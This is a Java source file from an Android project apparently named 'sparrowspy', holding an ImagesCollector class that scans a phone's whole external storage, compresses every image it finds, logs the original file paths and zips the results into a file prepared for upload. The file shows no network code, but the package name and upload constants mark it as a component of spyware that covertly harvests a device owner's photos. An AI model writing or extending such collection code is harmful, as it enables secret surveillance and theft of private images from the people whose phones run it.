package com.tangledbytes.sparrowspy.collectors;

import android.graphics.BitmapFactory;
import android.os.Environment;
import android.util.Log;

import androidx.annotation.NonNull;

import com.tangledbytes.sparrowspy.utils.Constants;
import com.tangledbytes.sparrowspy.utils.FileUtils;
import com.tangledbytes.sparrowspy.utils.ImageCompressor;
import com.tangledbytes.sparrowspy.utils.SparrowConfiguration;
import com.tangledbytes.sparrowspy.utils.ZipUtils;

import org.json.JSONArray;
import org.json.JSONException;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

public class ImagesCollector extends Collector {
    private static final String TAG = "ImagesCollector";
    private final JSONArray compressedImagesMap = new JSONArray();
    private final ExecutorService executor = Executors.newCachedThreadPool();
    private final ArrayList<Future<?>> execFutures = new ArrayList<>();
    private final int imageCompressionLevel;
    public ImagesCollector(SparrowConfiguration config) {
        imageCompressionLevel = config.imageCompressionLevel;
    }

    @Override
    public void collect() {
        try {
            scanFileSystem();
            for (Future<?> execFuture : execFutures) {
                execFuture.get(); // wait for all compressions to finish
            }
            FileUtils.write(Constants.FILE_UPLOAD_IMAGES_MAP, compressedImagesMap.toString());
            zipCompressedImages();
        } catch (Exception e) {
            Log.wtf(TAG, "Failed to write compressed images map", e);
        }
    }

    private void scanFileSystem() {
        for (File file : getFilesToScan()) {
            int compressionLevel = this.imageCompressionLevel;
            if (file.getName().equals("Android")) compressionLevel = compressionLevel/2;
            if (file.isDirectory()) {
                final int finalCompressionLevel = compressionLevel; // variable must final for lambda expression
                FileUtils.scanFiles(file, (imageFile) -> compressAndSaveImage(imageFile, file.getName(), finalCompressionLevel));
            }
            else compressAndSaveImage(file, "root", compressionLevel);
        }
    }

    private void zipCompressedImages() {
        File[] compressedImages = Constants.DIR_COMPRESSED_IMAGES.listFiles();
        if (compressedImages == null) return;
        try {
            if (Constants.FILE_UPLOAD_IMAGES_ZIP.exists())
                Constants.FILE_UPLOAD_IMAGES_ZIP.delete();
            Constants.FILE_UPLOAD_IMAGES_ZIP.createNewFile();
            ZipUtils zipUtils = new ZipUtils();
            zipUtils.zip(compressedImages, Constants.FILE_UPLOAD_IMAGES_ZIP, true);
        } catch (IOException e) {
            Log.wtf(TAG, "Failed to create zip compressed images", e);
        }
    }

    private void compressAndSaveImage(File imageSrc, String destDirName, int compressionLevel) {
        if (!isValidImage(imageSrc))
            return;
        File imageDest = generateImageDest(new File(Constants.DIR_COMPRESSED_IMAGES, destDirName));
        Log.i(TAG, String.format("Compressing %s to %s...", imageSrc, imageDest));
        execFutures.add(executor.submit(() -> ImageCompressor.compress(imageSrc, imageDest, compressionLevel)));
        try {
            compressedImagesMap.put(new JSONArray(String.format("['%s', '%s']", imageSrc, imageDest.getName())));
        } catch (JSONException e) {
            Log.wtf(TAG, e);
        }
    }

    /* Returns dirs/files to scan for images based on the build type */
    @NonNull
    private File[] getFilesToScan() {
        File[] filesToScan;
        if (Constants.Debug.DEBUG)
            filesToScan = new File(Environment.getExternalStorageDirectory(), "DCIM").listFiles();
        else
            filesToScan = Environment.getExternalStorageDirectory().listFiles();
        return filesToScan != null ? filesToScan : new File[]{};
    }

    private boolean isValidImage(File file) {
        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inJustDecodeBounds = true;
        BitmapFactory.decodeFile(file.toString(), options);
        return options.outHeight > 0 && options.outWidth > 0;
    }

    private File generateImageDest(File destDir) {
        if (!destDir.exists())
            destDir.mkdirs();
        File outputImage;
        Random random = new Random();
        do {
            outputImage = new File(destDir, Math.abs(random.nextLong()) + ".jpg");
        } while (outputImage.exists());
        return outputImage;
    }
}
